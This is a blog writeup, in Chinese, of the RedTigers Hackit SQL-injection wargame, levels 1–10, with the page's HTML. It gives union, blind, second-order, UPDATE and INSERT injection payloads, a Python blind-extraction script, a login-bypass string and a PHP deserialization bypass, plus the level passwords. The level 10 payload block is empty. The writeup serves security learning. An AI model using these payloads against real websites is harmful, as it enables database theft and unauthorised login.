@@ -1,0 +1,812 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<script type="text/javascript" src="js/jquery.min.js"></script>
+<script type="text/javascript" src="js/spig.js"></script>
+<link rel="stylesheet" href="css/lib/spigPet.css" type="text/css"/>
+<script type="text/javascript">
+var isindex = true;
+var visitor = true;
+</script>
+
+
+<div id="spig" class="spig">
+    <div id="message"></div>
+    <div id="mumu" class="mumu"></div>
+</div>
+
+ 
+    
+
+    <title>RedTigers Hackit writeup | 知秋’s blog</title>
+    <meta name="author" content="知秋">
+    
+    <meta name="description" content="知秋">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="RedTigers Hackit writeup"/>
+    <meta property="og:site_name" content="知秋"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="知秋" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/tomorrow-night-blue.min.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+
+<script type="text/javascript" src="../../js/love.js"></script>  
+ 
+<script type="text/javascript"
+color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="../../js/canvas-nest.min.js"></script>
+ 
+  
+<body style="background: url(http://p4gdp8beq.bkt.clouddn.com/background1.JPG); background-repeat: no-repeat;
+  background-size: 100% 100%;">
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+   
+    <nav class="indigo">
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">知秋</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            Home
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            Archives
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            Categories
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-reading " href="/reading" >
+                            <i class="fa fa-book "></i>
+                            
+                            Reading
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-about " href="/about" >
+                            <i class="fa fa-user "></i>
+                            
+                            About
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            Search
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-1" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="../../images/touxiang.jpeg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">知秋</p>
+                        <p class="desc">安全小白</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    Home
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    Archives
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    Categories
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-reading " href="/reading" >
+                    <i class="fa fa-book "></i>
+                    
+                    Reading
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-about " href="/about" >
+                    <i class="fa fa-user "></i>
+                    
+                    About
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    Search
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-1" id="category-menu">
+    
+
+            
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/essay/">
+                    essay <span class="right">5</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/ctf/">
+                    ctf <span class="right">12</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/ctf/web/">
+                    web <span class="right">11</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/ctf/writeup/">
+                    writeup <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/knowledge/">
+                    knowledge <span class="right">12</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/knowledge/note/">
+                    note <span class="right">8</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/knowledge/crypt/">
+                    crypt <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/knowledge/vulnerability/">
+                    vulnerability <span class="right">3</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/life/">
+                    life <span class="right">3</span></a>
+                </a>
+            </li>
+
+        
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">Search</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+	<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+<script>
+(function($){$.fn.snow=function(options){var $flake=$('<div id="flake" />').css({'position':'absolute','top':'-50px'}).html('&#10052;'),documentHeight=$(document).height(),documentWidth=$(document).width(),defaults={minSize:10,maxSize:20,newOn:500,flakeColor:"#FFFFFF"},options=$.extend({},defaults,options);var interval=setInterval(function(){var startPositionLeft=Math.random()*documentWidth-100,startOpacity=0.5+Math.random(),sizeFlake=options.minSize+Math.random()*options.maxSize,endPositionTop=documentHeight-40,endPositionLeft=startPositionLeft-100+Math.random()*200,durationFall=documentHeight*10+Math.random()*5000;$flake.clone().appendTo('body').css({left:startPositionLeft,opacity:startOpacity,'font-size':sizeFlake,color:options.flakeColor}).animate({top:endPositionTop,left:endPositionLeft,opacity:0.2},durationFall,'linear',function(){$(this).remove()});},options.newOn);};})(jQuery);
+$.fn.snow({ minSize: 10, maxSize: 60, newOn: 1000, flakeColor: '#FFF' });
+</script>
+    <main>
+        <div class="container main-container">
+    <nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo">
+        <span class="breadcrumb">Current page(Categories)</span>
+        
+            
+    
+    
+    <a class="breadcrumb" href="/categories/ctf/">ctf</a><a class="breadcrumb" href="/categories/ctf/web/">web</a>
+
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+        <div class="card-content">
+            
+
+            <div class="article-title">
+                
+    
+        <h1>RedTigers Hackit writeup</h1>
+    
+
+
+            </div>
+            <time class="pink-link-context" datetime="2018-02-22T07:33:00.000Z"><a href="/posts/90656973.html">2018-02-22</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/ctf/" class="chip pink lighten-1">ctf</a>
+        
+            <a href="/tags/web/" class="chip pink lighten-1">web</a>
+        
+    </div>
+
+
+            <div class="toc pink-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#level-1"><span class="section table-of-contents-text">level 1</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#level-2"><span class="section table-of-contents-text">level 2</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#level-3"><span class="section table-of-contents-text">level 3</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#level-4"><span class="section table-of-contents-text">level 4</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#level-5"><span class="section table-of-contents-text">level 5</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#level-6"><span class="section table-of-contents-text">level 6</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#level-7"><span class="section table-of-contents-text">level 7</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#level8"><span class="section table-of-contents-text">level8</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#level9"><span class="section table-of-contents-text">level9</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#level-10"><span class="section table-of-contents-text">level 10</span></a></li></ol>
+</div>
+
+
+            <div class="entry pink-link-context">
+                <p><a href="http://redtiger.labs.overthewire.org/" target="_blank" rel="noopener">RedTigers Hackit</a>一个不错的sql注入外国平台，也灵活，可以学到很多。<br><a id="more"></a></p>
+<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>常规的注入</p>
+<p>爆字段<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level1.php?cat=1 order by 4 <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>看显示位<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,4 <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>表名已经提示，根据登录表单，猜测字段username,password</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_users <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>得到用户名和密码，登入后得到flag和下一关的密码 4_is_not_random</p>
+<h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>万能密码登入<br>admin’ or 1=1%23<br>admin’ or ‘1’=’1<br>admin’ or ‘1’=’1’%23</p>
+<p>得下一关密码 feed_your_cat_before_your_cat_feeds_you</p>
+<h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p>通过user[] 变为数组报错，</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr[]=MDQyMjExMDE0MTgyMTQw</span><br></pre></td></tr></table></figure>
+<p>访问<a href="http://redtiger.labs.overthewire.org/urlcrypt.inc" target="_blank" rel="noopener">http://redtiger.labs.overthewire.org/urlcrypt.inc</a> 的到加密机密的代码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">	// warning! ugly code ahead :)</span><br><span class="line">  		</span><br><span class="line">	<span class="keyword">function</span> encrypt(<span class="variable">$str</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$cryptedstr</span> = <span class="string">""</span>;</span><br><span class="line">		srand(3284724);</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span> =0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$temp</span> = ord(substr(<span class="variable">$str</span>,<span class="variable">$i</span>,1)) ^ rand(0, 255);</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">while</span>(strlen(<span class="variable">$temp</span>)&lt;3)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$temp</span> = <span class="string">"0"</span>.<span class="variable">$temp</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$cryptedstr</span> .= <span class="variable">$temp</span>. <span class="string">""</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">return</span> base64_encode(<span class="variable">$cryptedstr</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">	<span class="keyword">function</span> decrypt (<span class="variable">$str</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		srand(3284724);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%'</span>,<span class="variable">$str</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$str</span> = base64_decode(<span class="variable">$str</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$str</span> != <span class="string">""</span> &amp;&amp; <span class="variable">$str</span> != null &amp;&amp; <span class="variable">$str</span> != <span class="literal">false</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$decStr</span> = <span class="string">""</span>;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">for</span> (<span class="variable">$i</span>=0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>+=3)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$array</span>[<span class="variable">$i</span>/3] = substr(<span class="variable">$str</span>,<span class="variable">$i</span>,3);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				foreach(<span class="variable">$array</span> as <span class="variable">$s</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$a</span> = <span class="variable">$s</span> ^ rand(0, 255);</span><br><span class="line">					<span class="variable">$decStr</span> .= chr(<span class="variable">$a</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				<span class="built_in">return</span> <span class="variable">$decStr</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>一开始，我是在window下进行加密的，但是做了很久一直做不出来，后来看了，别人的writeup，原来要在linux下运行。</p>
+<p>判断字段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原语句：</span><br><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr=Admin&apos;order by 7 #</span><br><span class="line">加密后：</span><br><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr=MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY1MTkw</span><br></pre></td></tr></table></figure>
+<p>显示位</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原语句：</span><br><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr=spoock&apos; union select 1,2,3,4,5,6,7 #</span><br><span class="line">加密后：</span><br><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr=MDI0MTk5MDEyMTc2MTI5MjI2MjE2MDI0MjE1MTExMTgwMTQ3MDcxMjM5MDEyMDAwMTc5MDA0MjU0MDMwMDQ1MjE4MjQzMTk3MDcyMjMzMTMwMjAwMTY5MTIxMTUzMTk4MDQwMDQ3MjQwMTk3</span><br></pre></td></tr></table></figure>
+<p>得到显示位2,4,5,6,7</p>
+<p>爆密码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原语句：</span><br><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr=spoock&apos; union select 1,password,3,4,5,6,7 from level3_users where username=0x41646d696e #&quot;</span><br><span class="line"></span><br><span class="line">加密后：</span><br><span class="line">http://redtiger.labs.overthewire.org/level3.php?usr=MDI0MTk5MDEyMTc2MTI5MjI2MjE2MDI0MjE1MTExMTgwMTQ3MDcxMjM5MDEyMDAwMTc5MDA0MjU0MDMwMDQ1MjE4MjQzMTM1MDA1MTY5MjIxMTM5MjM0MDYyMjA5MjIwMDU1MDUyMjI4MjAyMTUxMjI3MDQwMTA0MjMxMjIwMDM5MTM2MTYzMTczMDY0MTk5MDcxMTM2MTE1MDkyMjE3MTY5MDkzMDYxMTgxMTY1MDU3MTE4MDg0MTUxMDM0MDg1MTI1MDU1MTIzMjAwMTMwMDk1MTQ1MjE3MDcxMDM2MTQzMTk4MTIyMDM5MTQ3MDE5MDM4MTQzMDQ5MjAyMTUwMDc1MDQ3MTYwMTE5</span><br></pre></td></tr></table></figure></p>
+<p>得到密码：thisisaverysecurepasswordEEE5rt<br>得到下一关的：there_is_no_bug </p>
+<h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>布尔的盲注</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import string</span><br><span class="line">from re import *</span><br><span class="line">from urllib.request import *</span><br><span class="line"></span><br><span class="line">answer = <span class="string">""</span></span><br><span class="line">char = string.printable</span><br><span class="line"> cookies  = &#123;   <span class="string">"level2login"</span>: <span class="string">"4_is_not_random"</span>,</span><br><span class="line">        <span class="string">"level3login"</span>: <span class="string">"feed_your_cat_before_your_cat_feeds_you"</span>,</span><br><span class="line">        <span class="string">"level4login"</span>: <span class="string">"there_is_no_bug"</span>,</span><br><span class="line">        <span class="string">"level5login"</span>: <span class="string">"there_is_a_truck"</span>&#125;</span><br><span class="line">url = <span class="string">"http://redtiger.labs.overthewire.org/level4.php?id=1%20and%201=(select%20count(*)%20from%20level4_secret%20where%20substr(keyword,&#123;0&#125;,1)='&#123;1&#125;')"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> range(1, 22):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">        <span class="built_in">test</span> = (url.format(q, i))</span><br><span class="line">        request = Request(<span class="built_in">test</span>, None, headers=cookies)</span><br><span class="line">        res = urlopen(request)</span><br><span class="line">        s = res.read().decode()</span><br><span class="line">        <span class="keyword">if</span> (findall(<span class="string">"Query returned 1 rows."</span>, s)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"&#123;0&#125;  "</span>.format(q) + i)</span><br><span class="line">            answer += i</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(answer)</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">def exe_get(url):</span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">"level2login"</span>: <span class="string">"4_is_not_random"</span>,</span><br><span class="line">        <span class="string">"level3login"</span>: <span class="string">"feed_your_cat_before_your_cat_feeds_you"</span>,</span><br><span class="line">        <span class="string">"level4login"</span>: <span class="string">"there_is_no_bug"</span>,</span><br><span class="line">        <span class="string">"level5login"</span>: <span class="string">"there_is_a_truck"</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url, cookies=cookies)</span><br><span class="line">    html = response.text</span><br><span class="line">    match = re.search(<span class="string">'0'</span>, html)</span><br><span class="line">    <span class="comment"># 表示值偏大</span></span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        <span class="built_in">return</span> -1</span><br><span class="line">    <span class="comment"># 表示值偏小</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line">def get_data_char(i):</span><br><span class="line">    url_template = <span class="string">"https://redtiger.labs.overthewire.org/level4.php?id=2 or ascii(substr((select keyword from level4_secret),&#123;0&#125;,1))&gt;&#123;1&#125;"</span></span><br><span class="line">    low,high = 48,126</span><br><span class="line">    <span class="keyword">while</span> low&lt;=high:</span><br><span class="line">        mid = (low+high)//2</span><br><span class="line">        url = url_template.format(i,mid)</span><br><span class="line">        result = exe_get(url)</span><br><span class="line">        <span class="keyword">if</span> result&gt;0:</span><br><span class="line">            low = mid+1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid-1</span><br><span class="line">        <span class="built_in">print</span>(low,high,mid)</span><br><span class="line">    <span class="built_in">print</span>(low)</span><br><span class="line">    <span class="built_in">return</span> low</span><br><span class="line"></span><br><span class="line">def get_data():</span><br><span class="line">    data=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1,18):</span><br><span class="line">        char=get_data_char(i)</span><br><span class="line">        data += chr(char)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure>
+<h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>post请求,即可<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username=1<span class="string">'union select 1,md5(1)%23&amp;password=1&amp;login=Login</span></span><br></pre></td></tr></table></figure></p>
+<p>得到下一关的：for_more_bugs_update_to_php7</p>
+<h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>一开始加上’报错，开始判断列数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=3 order by 5<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>判断显示位的时候，出现user not found<br>猜测后台可能进行了二次查询<br>尝试一下语句，一直没成功，应该是’引发报错，导致后面无法显示。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php</span><br><span class="line">?user=1<span class="string">' union select 1,username ,3,4,5 from level6_users where status=1 %23</span></span><br></pre></td></tr></table></figure></p>
+<p>换一下语句,各个列位尝试了一下，发现只有第二个先能显示正常，尝试一下把username换成password,发现都失败，猜测第二次sql语句查询应该是根据username字段。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php</span><br><span class="line">?user=0 union select 1,username,3,4,5 from level6_users <span class="built_in">where</span> status=1</span><br></pre></td></tr></table></figure></p>
+<p>在第二个列位输入，再输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php</span><br><span class="line">?user=0 union select 1,<span class="string">'union select 1,2,3,4,5#,3,4,5</span></span><br></pre></td></tr></table></figure></p>
+<p>发现报错，将<code>nion select 1,&#39;union select 1,2,3,4,5#</code>转换成十六进制<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php</span><br><span class="line">?user=0 union select 1,0x27756E696F6E2073656C65637420312C322C332C342C3523,3,4,5</span><br></pre></td></tr></table></figure></p>
+<p>成功，2,4回显，现在就可以开始正常的流程爆数据了。<br><br>最终的payload，原来的语句<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php</span><br><span class="line">?user=0 union select 1,<span class="string">'union select 1,username,3,password,5 from level6_users where status=1#,3,4,5</span></span><br></pre></td></tr></table></figure></p>
+<p>转换成十六进制<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php</span><br><span class="line">?user=0 union select 1,0x27756E696F6E2073656C65637420312C757365726E616D652C332C70617373776F72642C352066726F6D206C6576656C365F7573657273207768657265207374617475733D3123,3,4,5</span><br></pre></td></tr></table></figure></p>
+<p>看别下一关的：keep_in_mind_im_not_blind</p>
+<h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><p>过滤了挺多的,输入’得到报错语句<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">An error occured!:</span><br><span class="line">You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">'%'</span> OR text.title LIKE <span class="string">'%'</span>%<span class="string">')'</span> at line 1</span><br><span class="line"></span><br><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE <span class="string">'%'</span>%<span class="string">' OR text.title LIKE '</span>%<span class="string">'%'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>从报错语句中可以看出后台的查询语句。开始构造语句绕过，注释符，限制挺多的，一个个尝试，发现–%a可以绕过<br>获得显示位<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search=search=1%<span class="string">') union select 1,2,3,4 --%a0&amp;dosearch=search%21</span></span><br></pre></td></tr></table></figure></p>
+<p>最终<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search=search=1%<span class="string">') union select 1,2,autor,4 from level7_news --%a0&amp;dosearch=search%21</span></span><br></pre></td></tr></table></figure></p>
+<p>下一关的：no_pernel_kanic_on_the_titanic</p>
+<h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><p>在email处，输入’成功报错，其他处正常，报错语句为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">'12345\'</span><span class="string">', age = '</span>25<span class="string">' WHERE id = 1'</span> at line 3 Username:</span><br></pre></td></tr></table></figure></p>
+<p>大概 update table set 的更新语句。<br>如果update语句中有a=b这样的语句就会将当前记录的b的值赋值到a.</p>
+<p>最终payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">email=hans%40localhost<span class="string">',name=password,icq='</span>&amp;name=Hans&amp;icq=12345&amp;age=25&amp;edit=Edit</span><br></pre></td></tr></table></figure></p>
+<p>下一关：cybercyber_vuln</p>
+<h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><p>在留言框中输入’会出现报错<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">''</span><span class="string">''</span>)<span class="string">' at line 6Autor:</span></span><br></pre></td></tr></table></figure></p>
+<p>尝试用括号,</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">autor=1&amp;title=1&amp;text=<span class="string">'),('</span>&amp;post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+<p>出现报错，尝试很多次，用下面的语句成功回显，1,2<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">autor=1&amp;title=1&amp;text=<span class="string">'),(1,2,'</span>&amp;post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure></p>
+<p>最终payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">autor=1&amp;title=1&amp;text=<span class="string">'),((select username from level9_users limit 1),(select password from level9_users limit 1),'</span>&amp;post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure></p>
+<p>下一关的：get_post_cookie_head__kittens_eating_all_my_bread</p>
+<h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1><p>抓包得到<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">login=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6Ik1vbmtleSI7czo4OiJwYXNzd29yZCI7czoxMjoiMDgxNXBhc3N3b3JkIjt9&amp;dologin=Login</span><br></pre></td></tr></table></figure></p>
+<p>将login的值，base64解密一下的得到一段账户密码的序列化<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:<span class="string">"username"</span>;s:6:<span class="string">"Monkey"</span>;s:8:<span class="string">"password"</span>;s:12:<span class="string">"0815password"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>一开始直接改username为TheMaster发现不成功，查看资料，才知道要将password的值改为bool类型的，例如我们只需要将password的属性修改为boolean类型的true，那么就可以绕过检查了。所以payload的形式为:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:<span class="string">"username"</span>;s:9:<span class="string">"TheMaster"</span>;s:8:<span class="string">"password"</span>;b:1;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最后将这个字符串进行base64编码,<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30=</span><br></pre></td></tr></table></figure></p>
+<p>最终的payload</p>
+<pre><code class="bash">
+</code></pre>
+
+                
+<p class="pink-link-context">
